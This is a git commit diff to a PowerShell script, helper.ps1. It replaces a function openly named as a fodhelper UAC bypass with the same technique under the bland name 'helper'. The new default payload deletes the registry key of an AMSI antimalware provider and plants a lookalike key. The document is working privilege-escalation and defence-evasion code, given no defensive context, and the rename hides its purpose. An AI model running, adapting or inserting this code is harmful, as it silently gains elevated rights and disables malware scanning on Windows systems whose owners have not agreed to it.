84b84a0c41185c0ba761db200cff24d7e8b712a1
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-29 19:35:18 -0600

    Update helper.ps1

--- helper.ps1
+++ helper.ps1
@@ -1,16 +1,18 @@
-function FodhelperUACBypass(){ 
- Param (
-           
-        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
-       )
-　
-    #Create Registry Structure
-    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
-　
-    #Start fodhelper.exe
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-　
-  
-　}
+function helper(){ 
+ #thx JH!!
+
+Param (    
+ 
+ [String]$custom = "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse" #default
+ 
+      )
+ 
+#Registry Command Edit
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $custom -Force
+ 
+#Bypass Execution
+Start-Process "C:\Windows\System32\fodhelper.exe"
+}
